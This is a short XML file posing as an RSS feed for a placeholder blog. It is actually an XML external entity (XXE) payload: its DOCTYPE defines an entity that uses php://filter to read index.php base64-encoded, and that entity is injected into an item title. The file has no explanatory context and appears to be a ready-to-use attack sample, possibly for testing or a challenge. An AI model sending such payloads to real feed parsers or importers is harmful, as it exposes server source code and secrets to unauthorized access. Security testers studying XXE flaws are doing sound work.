<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
    <!ELEMENT title ANY>
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
]>
<rss version="1.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>The Blog</title>
        <link>http://example.com/</link>
        <description>A blog about things</description>
        <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
        <item>
            <title>&xxe;</title>
            <link>http://example.com</link>
            <description>a post</description>
            <author>author@example.com</author>
            <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
        </item>
    </channel>
</rss>
